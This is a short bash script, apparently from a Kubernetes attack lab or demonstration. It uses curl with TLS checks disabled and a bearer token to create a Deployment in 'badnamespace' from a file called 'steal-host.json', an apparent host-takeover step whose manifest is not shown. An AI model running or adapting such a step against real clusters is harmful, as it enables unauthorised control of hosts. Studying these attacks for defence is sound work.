#!/bin/bash
curl -ik -X POST -H "Authorization: Bearer ${TOKEN}"  -H "Content-Type: application/json" https://$API_SERVER_HOST:$API_SERVER_PORT/apis/apps/v1/namespaces/badnamespace/deployments -d @steal-host.json
